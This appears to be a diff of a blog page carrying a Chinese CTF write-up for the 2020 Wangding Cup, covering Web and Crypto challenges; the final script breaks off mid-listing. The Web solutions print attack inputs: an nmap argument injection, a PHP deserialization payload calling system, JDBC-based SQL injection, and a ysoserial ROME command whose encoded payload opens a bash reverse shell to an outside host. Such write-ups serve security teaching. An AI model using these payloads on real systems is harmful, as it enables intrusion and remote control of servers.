@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://igml.top">
-  <title>Tag: Web | gml&#39;s blog</title>
+  <title>2020网鼎杯-朱雀组wp | gml&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="gml,博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="gml&#39;s blog">
-<meta property="og:url" content="http:&#x2F;&#x2F;igml.top&#x2F;tags&#x2F;Web&#x2F;page&#x2F;2&#x2F;index.html">
+  <meta name="description" content="Webnmap可以扫描ip，尝试命令注入未果，应该是调用了nmap进行扫描。">
+<meta name="keywords" content="CTF,Web,Crypto">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020网鼎杯-朱雀组wp">
+<meta property="og:url" content="http:&#x2F;&#x2F;igml.top&#x2F;2020&#x2F;05&#x2F;18&#x2F;2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80&#x2F;index.html">
 <meta property="og:site_name" content="gml&#39;s blog">
+<meta property="og:description" content="Webnmap可以扫描ip，尝试命令注入未果，应该是调用了nmap进行扫描。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-21d75094c0b434e2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a93e2a84b569cc08.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-002248aa671587e7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-bc25eb7e982fffd3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-5d91acf48a023ca4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-0fd81c5d04ad08c1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-c2056d3de83b64d7.png">
+<meta property="og:updated_time" content="2020-05-18T16:29:40.503Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-21d75094c0b434e2.png">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -155,36 +166,131 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-2020-网鼎杯-朱雀" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2020网鼎杯-朱雀组wp
+    </h1>
+  
+
+        
+        <a href="/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/" class="archive-article-date">
+  	<time datetime="2020-05-18T02:58:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-18</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>可以扫描ip，尝试命令注入未果，应该是调用了nmap进行扫描。</p>
+<a id="more"></a>
+
+<p>nmap可以读取文件中的内容进行扫描，flag肯定是非法ip，nmap输出会把内容报错出来，利用这个特点，把结果输出到web目录下的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; -iL /flag -oN /var/www/html/abc.txt &apos;</span><br></pre></td></tr></table></figure>
+
+<p> 访问abc.txt。</p>
+<h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>传入的p与func是 $func($p) 形式执行，可以读到源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=readfile&amp;p=index.php</span><br></pre></td></tr></table></figure>
+
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ban了执行代码之类的函数，gettime 有个 call_user_func，还有个类，想到可以反序列化。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"ls"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"system"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Test());</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-21d75094c0b434e2.png" alt="image.png"></p>
+<p>读取flag。</p>
+<h3 id="think-java"><a href="#think-java" class="headerlink" title="think java"></a>think java</h3><p>这个题比赛做了一半，在buuoj复现的。</p>
+<p>扫了一波目录，发现了swagger-ui.html，看到了三个api：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-a93e2a84b569cc08.png" alt="image.png"></p>
+<p>sqlDict传入一个dbname。</p>
+<p>给了部分class，拖到jdgui分析，jdbc连接数据库：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/"</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/myapp"</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>))</span><br><span class="line">        user = <span class="string">"root"</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>))</span><br><span class="line">        pass = <span class="string">"abc@12345"</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中，test 接口可以传入 dbName，拼接到连接，想到了jdbc反序列化，往下看。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">  List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">  String TableName = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">    ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[] &#123; <span class="string">"TABLE"</span> &#125;);</span><br><span class="line">    <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">      TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">      Table table = <span class="keyword">new</span> Table();</span><br><span class="line">      String sql = <span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '"</span> + dbName + <span class="string">"' and table_name='"</span> + TableName + <span class="string">"';"</span>;</span><br><span class="line">      ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">      <span class="keyword">while</span> (rs.next())</span><br><span class="line">        table.setTableDescribe(rs.getString(<span class="string">"TABLE_COMMENT"</span>)); </span><br><span class="line">      table.setTableName(TableName);</span><br><span class="line">      ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">""</span>);</span><br><span class="line">      ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line">      String PK;</span><br><span class="line">      <span class="keyword">for</span> (PK = <span class="string">""</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">      <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">        Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">"COLUMN_NAME"</span>), data.getString(<span class="string">"TYPE_NAME"</span>), data.getString(<span class="string">"COLUMN_DEF"</span>), data.getString(<span class="string">"NULLABLE"</span>).equals(<span class="string">"1"</span>) ? <span class="string">"YES"</span> : <span class="string">"NO"</span>, data.getString(<span class="string">"IS_AUTOINCREMENT"</span>), data.getString(<span class="string">"REMARKS"</span>), data.getString(<span class="string">"COLUMN_NAME"</span>).equals(PK) ? <span class="string">"true"</span> : <span class="keyword">null</span>, data.getString(<span class="string">"COLUMN_SIZE"</span>));</span><br><span class="line">        table.list.add(row);</span><br><span class="line">      &#125; </span><br><span class="line">      Tables.add(table);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">    var16.printStackTrace();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> Tables;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有注入的样子，把dbname拼接到了语句里。</p>
+<p>应该是注入出用户名密码，然后登陆，登陆后面还有题。</p>
+<p>但是我们传入的 dbname需要正确连接，同时还要注入，可以用#截断使jdbc正常连接，然后注入payload放到后面。</p>
+<p>可以注入出用户名和密码：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-002248aa671587e7.png" alt="image.png"></p>
+<p>用户名是 admin，密码是admin@Rrrr_ctf_asde。</p>
+<p>登陆，发现给了个token。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-bc25eb7e982fffd3.png" alt="image.png"></p>
+<p>Bearer后面部分明显是序列化数据的base64编码，还有个current接口，我们把token post过去，发现校验成功。</p>
+<p>思路很清晰了，current会反序列化我们传入的数据，我们需要 getshell，但是没有gadget。。。</p>
+<p>比赛的时候卡在了这里。。。本来这个题放出来一阵子都只有3个队做出来，后来突然就几十支了，佛了。</p>
+<p>赛后问了一波，貌似是用ysoserial挨个exp打？</p>
+<p>ysoserial 是个集成了java反序列化exp的工具，github在这里：<a href="https://github.com/frohoff/ysoserial。" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial。</a></p>
+<p>这个题是用 ROME 打的，首先下载ysoserial文件，因为java 反弹shell容易出问题，找了个在线网站改一下payload：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-5d91acf48a023ca4.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar ROME <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MTc4LTg5N2VhMDQwLTU2YzAtNDg2NC04NWM1LWE4YWY4ZmJjMmY4ZS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span> | base64</span><br></pre></td></tr></table></figure>
+
+<p>把生成的base64，current接口发过去（记得前面加Bearer。。因为没加Bearer找了半天问题orz）</p>
+<p>可以弹到shell：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-0fd81c5d04ad08c1.png" alt="image.png"></p>
+<p>顺便说一句，如果打不成，可以试着先用ysoserial的URLDNS模块测试反序列化是否可以用，先把URLDNS打成。</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h3><p>仿射密码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">enc = <span class="string">"kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;"</span></span><br><span class="line">k1 = <span class="number">123456</span> % <span class="number">26</span></span><br><span class="line">k2 = <span class="number">321564</span> % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        flag += c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">if</span> (k1 * (ord(m) - ord(<span class="string">'a'</span>)) + k2) % <span class="number">26</span> == ord(c) - ord(<span class="string">'a'</span>):</span><br><span class="line">                flag += m</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h3><p>三组n与c，没有e，n都很大，相互互素。</p>
+<p>考虑中国剩余定理，然后开三次方，开不出来。N有大约6000多bit，爆破e开方，发现是17次方。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">18856599160001833299560082802925753595735945621023660831294740454109973698430284916320395522883536507135735383517926050963512440162483065097256884040938259092582892259657340825971260278387406398529168309426241530551396056450450728728601248269612166083300938497235910244979946020059799495231539400114422748104072550004260736766137354572252872437140063474603268146956570787143010441293268321641092743010805639953103578977668248726500636191043930770036787317928372179939360510179438436665591755940224156131460271763912868322774604558314812111335691108887319827579162188169744014973478052491398688611046800951698773893393</span></span><br><span class="line">c1 = <span class="number">8024667293310019199660855174436055144348010556139300886990767145319919733369837206849070207955417356957254331839203914525519504562595117422955140319552013305532068903324132309109484106720045613714716627620318471048195232209672212970269569790677144450501305289670783572919282909796765124242287108717189750662740283813981242918671472893126494796140877412502365037187659905034193901633516360208987731322599974612602945866477752340080783296268396044532883548423045471565356810753599618810964317690395898263698123505876052304469769153374038403491084285836952034950978098249299597775306141671935146933958644456499200221696</span></span><br><span class="line">c2 = <span class="number">17388575106047489057419896548519877785989670179021521580945768965101106268068805843720622749203590810185213416901978773748832854888898576822477243682874784689127705334243899967896321836688567602323551986980634884700045627950473546069670440078998428940082620044462222475031805594211784370238038168894827559017562364252406425134530719911057780692073760058203345936344269833206906999625580911856011564697811258009937314511410514416706482571471852503756675411177080916350899445106002226392895645443215522671155311715637759618276305217468892076287376401516124640727839779731609203202530346427613422430202271506248285086956</span></span><br><span class="line">n2 = <span class="number">21996468204721630460566169654781925102402634427772676287751800587544894952838038401189546149401344752771866376882226876072201426041697882026653772987648569053238451992877808811034545463363146057879646485465730317977739706776287970278094261290398668538232727000322458605289913900919015380904209692398479885177984131014170652915222062267448446642158394150657058846328033404309210836219241651882903083719822769947131283541299760283547938795574020478852839044803553093825730447126796668238131579735916546235889726257184058908852902241422169929720898025622336508382492878690496154797198800699611812166851455110635853297883</span></span><br><span class="line">c3 = <span class="number">5170826942130658374627267470548549396328896108666717036999395626588154882531377393671593939192779292151584678688653835775920356845071292462816417186595460417761844407911946323815187102170021222644920874070699813549492713967666736815947822200867353461264579419205756500926218294604616696969184793377381622818381733352202456524002876336304465082656612634304327627259494264840838687207529676882041997761204004549052900816658341867989593333356630311753611684503882509990853456022056473296726728969894815574884063807804354952314391764618179147583447848871220103094864884798102542377747761263052887894135796051521881179607</span></span><br><span class="line">n3 = <span class="number">22182114562385985868993176463839749402849876738564142471647983947408274900941377521795379832791801082248237432130658027011388009638587979450937703029168222842849801985646044116463703409531938580410511097238939431284352109949200312466658018635489121157805030775386698514705824737070792739967925773549468095396944503293347398507980924747059180705269064441084577177316227162712249300900490014519213102070911105044792363935553422311683947941027846793608299170467483012199132849683112640658915359398437290872795783350944147546342693285520002760411554647284259473777888584007026980376463757296179071968120796742375210877789</span></span><br><span class="line"></span><br><span class="line">m =  GCRT([n1,n2,n3],[c1,c2,c3])[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    flag = long_to_bytes(gmpy2.iroot(m,e)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+<h3 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h3><p>需要解出前面的方程，得到第7个d，才可以有得到后面10个输出的机会。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = getPrime(<span class="number">64</span>)</span><br><span class="line">b = getPrime(<span class="number">64</span>)</span><br><span class="line">c = getPrime(<span class="number">64</span>)</span><br><span class="line">d = int(urandom(<span class="number">8</span>).encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    d = (d * a + c) % b</span><br><span class="line">    code.append(d)</span><br></pre></td></tr></table></figure>
+
+<p>给了前六个d，需要求出第七个d。解方程比较麻烦在于b是模数并且未知。</p>
+<p>参考<a href="https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulus。" target="_blank" rel="noopener">https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulus。</a></p>
+<p>我们目前拥有5个方程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1*a + c = x2 mod b</span><br><span class="line">x2*a + c = x3 mod b</span><br><span class="line">x3*a + c = x4 mod b</span><br><span class="line">x4*a + c = x5 mod b</span><br><span class="line">x5*a + c = x6 mod b</span><br></pre></td></tr></table></figure>
+
+<p>大致思路就是通过等式相减，得到一些 x*a=y mod b的方程，然后挑两个互素的x作为基底，通过这两个式子构造出 a=m mod b，再任意挑选一 x0*a=y0 mod b，得到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m*x0=y0 mod b</span><br></pre></td></tr></table></figure>
+
+<p>得到 b|(m*x2-y2)，再分解b，找出其中的64bit的素数，就还原了b。还原b后a和c就好算了。</p>
+<p>然后有十次机会猜数，game其实是个39bit的lfsr，初态与key未知，需要78bit还原，正常情况下得到78bit需要十个数，但是十个数错误后直接退出了，所以需要猜十次的过程中，猜对一个。（写个循环爆破）</p>
+<p>概率是 <code>1-(255/256)^10</code>，大约是 3%。</p>
+<p>猜对后，可以根据78bit还原初态与key，和去年de1ctf的思路一样，解方程组就好了，高斯消元法，可以参考<a href="http://igml.top/2019/08/04/2019-de1ctf/#babylfsr">http://igml.top/2019/08/04/2019-de1ctf/#babylfsr</a></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 